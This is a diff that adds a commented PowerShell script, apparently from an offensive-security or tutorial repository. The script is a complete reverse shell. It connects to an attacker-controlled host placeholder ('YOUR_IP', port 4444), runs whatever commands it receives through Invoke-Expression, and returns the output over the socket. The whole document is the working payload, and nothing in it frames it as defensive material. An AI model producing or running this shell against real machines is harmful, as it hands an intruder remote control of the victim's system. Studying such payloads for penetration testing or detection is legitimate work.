@@ -1,0 +1,31 @@
+# Establish a TCP connection to the attacker's machine
+$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP', 4444)
+
+# Get the network stream for communication
+$stream = $client.GetStream()
+
+# Create a byte array buffer to store incoming data (commands from attacker)
+[byte[]]$bytes = 0..65535 | % {0}
+
+# Read incoming commands and execute them in a loop
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    
+    # Decode received bytes into a PowerShell command
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+
+    # Execute the command and capture the output
+    $sendback = (iex $data 2>&1 | Out-String)
+
+    # Append the current working directory (for better interaction)
+    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+
+    # Convert the output to bytes for transmission
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+
+    # Send the command output back to the attacker
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush() # Ensure data is sent immediately
+}
+
+# Close the connection when the session ends
+$client.Close()
